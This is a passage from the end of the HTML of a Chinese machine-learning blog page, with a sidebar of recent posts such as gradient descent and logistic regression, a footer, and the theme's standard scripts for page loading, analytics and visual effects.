href="#3-magic-method"><span class="toc-text">3、Magic Method</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/10/13/image-encryption/" title="图像加密"><img src="/img/35.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="图像加密"/></a><div class="content"><a class="title" href="/2023/10/13/image-encryption/" title="图像加密">图像加密</a><time datetime="2023-10-13T03:24:07.000Z" title="发表于 2023-10-13 11:24:07">2023-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/20/Regularization/" title="正则化"><img src="/img/33.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="正则化"/></a><div class="content"><a class="title" href="/2023/07/20/Regularization/" title="正则化">正则化</a><time datetime="2023-07-20T03:32:37.000Z" title="发表于 2023-07-20 11:32:37">2023-07-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/14/logistic-regression/" title="逻辑回归"><img src="/img/12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="逻辑回归"/></a><div class="content"><a class="title" href="/2023/06/14/logistic-regression/" title="逻辑回归">逻辑回归</a><time datetime="2023-06-14T04:33:25.000Z" title="发表于 2023-06-14 12:33:25">2023-06-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/12/normal-equation/" title="正规方程"><img src="/img/32.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="正规方程"/></a><div class="content"><a class="title" href="/2023/06/12/normal-equation/" title="正规方程">正规方程</a><time datetime="2023-06-12T08:14:13.000Z" title="发表于 2023-06-12 16:14:13">2023-06-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/11/gradient-descent/" title="梯度下降"><img src="/img/31.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="梯度下降"/></a><div class="content"><a class="title" href="/2023/06/11/gradient-descent/" title="梯度下降">梯度下降</a><time datetime="2023-06-11T07:10:08.000Z" title="发表于 2023-06-11 15:10:08">2023-06-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By cgrona</div><div class="icp"><a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/"><img class="icp-icon" src="/img/2022002701.png"/><span>桂ICP备2022002701号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
